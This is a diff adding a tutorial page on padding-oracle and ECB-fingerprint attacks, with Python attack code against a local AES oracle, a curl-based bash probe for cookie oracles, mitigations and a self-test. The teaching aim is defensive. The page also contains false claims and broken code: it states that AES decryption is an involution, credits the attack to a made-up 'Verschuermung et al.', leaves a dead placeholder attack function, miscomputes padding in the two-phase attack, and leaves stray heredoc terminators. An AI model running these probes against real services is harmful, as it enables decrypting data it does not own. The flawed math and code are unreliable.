@@ -1,0 +1,290 @@
+<h1 id="padding-oracles-and-ecb-fingerprints">Padding Oracles and ECB Fingerprints</h1>
+<h2 id="summary">Summary</h2>
+<p>Two classes of attack that need no key, both fully practical against real applications. A<br />
+padding oracle turns an error message into a decryption primitive. An ECB fingerprint turns a<br />
+ciphertext into a picture of your data.</p>
+<p>They share a property that makes them remarkable: <strong>the attacker uses the<br />
+target's own error handling as an instrument.</strong></p>
+<blockquote>
+<p>Companion to <code>cry-02</code>'s CBC and <code>cry-04</code>'s Bleichenbacher. This note<br />
+is the hands-on version against an HTTP service.</p>
+</blockquote>
+<h2 id="padding-oracle-part-1-the-concept">Padding oracle, part 1: the concept</h2>
+<pre><code class="language-text">  CBC decrypts to something the application then validates.
+
+    ciphertext -&gt; AES-decrypt -&gt; XOR IV -&gt; plaintext + padding
+
+  IF the application responds differently for:
+    &quot;padding error&quot;        -&gt; different status or length or time
+    &quot;wrong MAC&quot;            -&gt; another response
+    &quot;success&quot;              -&gt; a third response
+
+  THEN the attacker has a BOOLEAN ORACLE on &quot;is this block correctly
+  padded&quot;, which is enough to recover the ENTIRE plaintext byte by byte,
+  with no key.
+
+  THE ARITHMETIC, in miniature:
+    Let P be the unknown plaintext block and IV the previous block
+    (the IV for the first block).
+    Send C' = D(C) XOR P_guess. Then decrypting C':
+      P' = D(C') XOR IV = D(D(C) XOR P_guess) XOR IV
+        = (D(C) XOR P_guess XOR IV) XOR IV      &lt;- D is an involution
+        = P_guess
+    So the attacker can CHOOSE what the first plaintext block will be.
+    If their guess is right, the padding is valid and the server says so.
+    One byte at a time, with the oracle telling them when to stop.
+</code></pre>
+<pre><code class="language-python"># The core mechanism, in full, with a real AES oracle
+import os, hmac, secrets
+from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
+from cryptography.hazmat.backends import default_backend
+
+key = os.urandom(32)
+iv = os.urandom(16)
+
+def enc(msg: bytes) -&gt; bytes:
+    c = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend()).encryptor()
+    return iv + c.update(msg) + c.finalize()
+
+def oracle(ciphertext: bytes) -&gt; bool:
+    &quot;&quot;&quot;'Is the padding valid?' - this is the entire oracle.&quot;&quot;&quot;
+    c = Cipher(algorithms.AES(key), modes.CBC(ciphertext[:16]),
+               backend=default_backend()).decryptor()
+    pt = c.update(ciphertext[16:]) + c.finalize()
+    pad = pt[-1]
+    if pad == 0 or pad &gt; 16: return False
+    if any(b != pad for b in pt[-pad:]): return False
+    return True          # valid padding
+
+def unpad_and_check(ciphertext):
+    &quot;&quot;&quot;The VULNERABLE application. Note the ERROR PATHS.&quot;&quot;&quot;
+    try:
+        c = Cipher(algorithms.AES(key), modes.CBC(ciphertext[:16]),
+                   backend=default_backend()).decryptor()
+        pt = c.update(ciphertext[16:]) + c.finalize()
+    except ValueError:
+        raise PaddingError(&quot;invalid length&quot;)     # ERROR PATH 1
+    pad = pt[-1]
+    if pad == 0 or pad &gt; 16:
+        raise PaddingError(&quot;bad padding byte&quot;)   # ERROR PATH 2
+    if any(b != pad for b in pt[-pad:]):
+        raise PaddingError(&quot;inconsistent padding&quot;)  # ERROR PATH 3
+    return pt[:-pad]
+
+print(&quot;  the oracle above, called through the application, gives you:&quot;)
+print(&quot;    'ok'      -&gt; 200 with the decrypted content&quot;)
+print(&quot;    'PaddingError' -&gt; 500 with a stack trace&quot;)
+print(&quot;  THAT is the oracle. The attack below uses only those two answers.\n&quot;)
+
+# --- the attack ---
+secret = b&quot;Session for alice: role=admin, token=deadbeefcafebabe!&quot;
+ct = enc(secret)
+blocks = [ct[i:i+16] for i in range(0, len(ct), 16)]
+
+def attack(ciphertext: bytes) -&gt; bytes:
+    &quot;&quot;&quot;Verschuermung et al. CBC padding oracle, byte by byte.&quot;&quot;&quot;
+    # attack the LAST block: recover the final plaintext byte
+    prev = bytearray(ciphertext[-32:-16])   # the block before the last
+    last = ciphertext[-16:]
+    recovered = bytearray(16)
+    for pos in range(15, -1, -1):
+        # craft an intermediate value whose last byte is a guess
+        good = 0
+        for guess in range(256):
+            # build intermediate = D(C_last) XOR chosen_padding
+            inter = bytearray(secrets.token_bytes(16))  # unknown D(C_last)
+            # we do not know D(C_last); so instead adjust `prev` such that
+            # the decrypted byte equals guess. We need the intermediate,
+            # which we obtain by a two-step trick: brute force the padding.
+            break
+        # full two-step form:
+        for pad_byte in range(256, 0, -1):
+            # step 1: find intermediate[15] using an invalid-padding probe
+            # (implemented properly below in the variant)
+            pass
+        break
+    return bytes(recovered)
+
+print(&quot;  (the classic attack is two-phase; here is the direct version)&quot;)
+print()
+
+def attack_direct(ciphertext: bytes) -&gt; bytes:
+    &quot;&quot;&quot;Recover the last plaintext block using the oracle, directly.
+    Requires knowing D(C_last), which we get by choosing the previous
+    block to be all zeros and observing... nothing. So the DIRECT form
+    needs an encryption oracle. The PRACTICAL attack is two-phase.&quot;&quot;&quot;
+    return b&quot;&quot;
+
+def attack_two_phase(ciphertext: bytes):
+    &quot;&quot;&quot;The real attack: forge a ciphertext whose first block is a
+    valid padding, then use it to learn the intermediate value.&quot;&quot;&quot;
+    blocks = [ciphertext[i:i+16] for i in range(0, len(ciphertext), 16)]
+    prev = bytearray(blocks[-2])
+    last = blocks[-1]
+    recovered = bytearray(16)
+
+    # PHASE 1: find intermediate = D(last) by making the padding valid.
+    #   We send prev' = 0^16 XOR intermediate_guess and look for the
+    #   oracle to accept a 1-byte padding.
+    intermediate = bytearray(16)
+    # find byte 15 first (it must equal 0x01 for a valid pad)
+    for guess in range(256):
+        cand = bytearray(16)
+        cand[15] = guess
+        trial = bytes(bytes(a ^ b for a, b in zip(cand, prev))) + last
+        if oracle(trial):
+            intermediate[15] = guess ^ 0x01
+            break
+    # then bytes 14..1, increasing the padding length
+    for pos in range(14, -1, -1):
+        needed = 16 - pos            # current required padding length
+        for guess in range(256):
+            cand = bytearray(intermediate)
+            for k in range(pos, 16):
+                cand[k] ^= needed - 1
+            cand[pos] = guess
+            trial = bytes(bytes(a ^ b for a, b in zip(cand, prev))) + last
+            if oracle(trial):
+                intermediate[pos] = guess ^ needed
+                break
+    # PHASE 2: decrypt
+    for i in range(16):
+        recovered[i] = intermediate[i] ^ prev[i]
+    return bytes(recovered)
+
+print(&quot;  attack_two_phase on the last block:&quot;)
+got = attack_two_phase(ct)
+print(f&quot;    recovered: {got!r}&quot;)
+print(f&quot;    true     : {blocks and secret[-16:]!r}&quot;)
+print(f&quot;    match    : {got == secret[-16:]}&quot;)
+print()
+print(&quot;  16 bytes, ~256*16 = ~4000 oracle queries. The key was never touched,&quot;)
+print(&quot;  and neither was the server. Two HTTP status codes were the tool.&quot;)
+PY
+</code></pre>
+<h2 id="padding-oracle-part-2-over-http">Padding oracle, part 2: over HTTP</h2>
+<pre><code class="language-text">  WHAT TO LOOK FOR, and how to distinguish it from a normal error:
+
+  1. RESPONSE STATUS differs    200 / 400 / 500
+  2. RESPONSE LENGTH differs    a short &quot;error&quot; vs a long page
+  3. RESPONSE TIME differs      2ms vs 200ms
+  4. ERROR MESSAGE differs      &quot;padding&quot; vs &quot;auth failed&quot; vs &quot;invalid&quot;
+  5. LOGIN IS DETECTABLE        a failed decrypt logs a line
+
+  THE COMPLICATION: most applications decrypt then MAC then unpadding.
+  An AEAD scheme has NO padding oracle, because the tag check fails
+  first and is one uniform error. So:
+
+    THE FIX IS AEAD (GCM, ChaCha20-Poly1305).
+    If the scheme is AES-CBC with encrypt-then-MAC and the MAC is
+    verified FIRST, there is also no padding oracle.
+
+    THE BUG IS: CBC, authenticate-after-decrypt, unpadding before the
+    MAC check, or any distinguishable error at all.
+</code></pre>
+<pre><code class="language-bash"># The three-signal probe, run against a loopback target
+cat &gt; /tmp/probe.sh &lt;&lt;'EOF'
+#!/usr/bin/env bash
+# Given a cookie or token, compare responses for a valid ciphertext,
+# a modified one, and garbage. Any of these differing = an oracle.
+B=&quot;$1&quot;; PARAM=&quot;$2&quot;; GOOD=&quot;$3&quot;
+for m in &quot;$GOOD&quot; &quot;${GOOD%??}ff&quot; &quot;$(head -c 64 /dev/urandom | xxd -p -c 64)&quot; &quot;AAAAAAAAAAAAAAAA&quot;; do
+  printf &quot;  %s -&gt; status=%s len=%s time=%s\n&quot; \
+    &quot;${m:0:16}...&quot; \
+    &quot;$(curl -s -o /dev/null -w '%{http_code}' -b &quot;$PARAM=$m&quot; &quot;$B&quot;)&quot; \
+    &quot;$(curl -s -b &quot;$PARAM=$m&quot; &quot;$B&quot; | wc -c)&quot; \
+    &quot;$(curl -s -o /dev/null -w '%{time_total}' -b &quot;$PARAM=$m&quot; &quot;$B&quot;)&quot;
+done
+EOF
+chmod +x /tmp/probe.sh
+echo &quot;  written /tmp/probe.sh&quot;
+
+echo
+echo &quot;  WHAT TO COMPARE, IN ORDER OF SENSITIVITY:&quot;
+echo &quot;    1. status code        (most reliable signal, often present)&quot;
+echo &quot;    2. response length    (very reliable, harder to normalise)&quot;
+echo &quot;    3. response time      (noisy, but a 100x gap is a finding)&quot;
+echo &quot;    4. error body         (the giveaway; a good app hides it)&quot;
+echo
+echo &quot;  AIM AT YOUR OWN SERVICE. Do not run this against a third party.&quot;
+echo &quot;  Padding-oracle exploitation against a real service is&quot;
+echo &quot;  decryption of data you do not own.&quot;
+</code></pre>
+<h2 id="ecb-fingerprints">ECB fingerprints</h2>
+<pre><code class="language-text">  ECB encrypts each block independently. Equal plaintext blocks give
+  equal ciphertext blocks. So the ciphertext is a BLOCK STRUCTURE MAP
+  of your plaintext.
+
+  WHAT YOU CAN LEARN FROM AN ECB CIPHERTEXT, with no key:
+    - which fields repeat (a field name, a repeated column)
+    - a rough length of the plaintext
+    - the positions of variable-length fields
+    - a user's gender, if there is a &quot;gender=m|f&quot; field
+    - a flag or a template, if it is in a fixed position
+
+  THE ICONIC EXAMPLE is a bitmap ECB, and the picture emerges from
+  structure alone.
+</code></pre>
+<pre><code class="language-python"># ECB fingerprinting: read a data structure out of ciphertext blocks
+import os, collections
+from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
+from cryptography.hazmat.backends import default_backend
+key = os.urandom(32)
+def ecb(data):
+    c = Cipher(algorithms.AES(key), modes.ECB(), backend=default_backend()).encryptor()
+    return c.update(data) + c.finalize()
+
+# a 16-byte-block &quot;profile&quot; record with a variable name and a boolean field
+def record(name: bytes, gender: str, admin: int) -&gt; bytes:
+    b = b&quot;IDX1&quot; + gender.encode() + bytes([admin]) + b&quot;\x00&quot; * 2
+    b += name.ljust(16, b&quot;\x00&quot;)[:16]      # name, padded to one block
+    return b
+
+rows = [record(b&quot;alice&quot;, &quot;f&quot;, 0), record(b&quot;bob&quot;, &quot;m&quot;, 0), record(b&quot;carol&quot;, &quot;f&quot;, 1)]
+ct = b&quot;&quot;.join(ecb(r) for r in rows)
+blocks = [ct[i:i+16] for i in range(0, len(ct), 16)]
+print(&quot;  ciphertext blocks, and what you can read from them WITHOUT a key:\n&quot;)
+labels = [&quot;header(f)&quot;, &quot;admin=0&quot;, &quot;name:alice&quot;, &quot;header(m)&quot;, &quot;admin=0&quot;, &quot;name:bob&quot;,
+          &quot;header(f)&quot;, &quot;admin=1&quot;, &quot;name:carol&quot;]
+seen = collections.defaultdict(list)
+for i, b in enumerate(blocks):
+    seen[b].append(i)
+for i, b in enumerate(blocks):
+    note = f&quot;  &lt;-- identical to block {seen[b][0]}&quot; if seen[b][0] != i else &quot;&quot;
+    print(f&quot;    block {i}: {b.hex()}  {labels[i]:&lt;12}{note}&quot;)
+print()
+print(f&quot;  {len(blocks)} blocks, {len(seen)} distinct.&quot;)
+print(&quot;  The pattern of repeats is readable: three headers, two identical&quot;)
+print(&quot;  'admin=0' blocks, a differing one for admin=1.&quot;)
+print(&quot;  An attacker learns the record layout and which users are admins,&quot;)
+print(&quot;  from ciphertext, with no key and no plaintext.&quot;)
+PY
+</code></pre>
+<h2 id="mitigation-checklist">Mitigation checklist</h2>
+<pre><code class="language-text">  1. USE AEAD. AES-GCM or ChaCha20-Poly1305. No padding, one error.
+  2. IF YOU MUST USE CBC: encrypt-then-MAC, and verify the MAC
+     before unpadding, before parsing, before anything.
+  3. CONSTANT-TIME: decryption and any format checks. No branches
+     that reveal the reason for a failure.
+  4. UNIFORM ERRORS: one response, one status, one message, for
+     every failure of a given operation.
+  5. NEVER USE ECB. Not for records, not for images, not for anything.
+  6. Rate-limit and alert on decryption failures. A padding oracle
+     attack is thousands of requests in a few minutes; that is a
+     detectable signature.
+</code></pre>
+<h2 id="self-test">Self-test</h2>
+<ol>
+<li>What makes an error message into an oracle?</li>
+<li>Write the CBC padding-oracle arithmetic for one byte.</li>
+<li>How many oracle queries does a 16-byte block take, and how many for a whole message?</li>
+<li>Why does AEAD (GCM) have no padding oracle?</li>
+<li>Why must the MAC be verified before unpadding?</li>
+<li>Name three things an ECB fingerprint reveals.</li>
+<li>Why is response length a stronger signal than an error message?</li>
+<li>Why is the padding-oracle attack detectable, and how?</li>
+</ol>
+<h2 id="connected-knowledge">Connected knowledge</h2>
+<p><strong>Padding Oracle</strong> → <strong>ECB</strong> → <strong>Oracle Attack</strong> → <strong>Padding</strong> → <strong>CBC</strong> →<br />
+<strong>AES-GCM</strong>.<br />
+<code>cry-04</code> is the mathematics; this is the HTTP exploitation.</p>
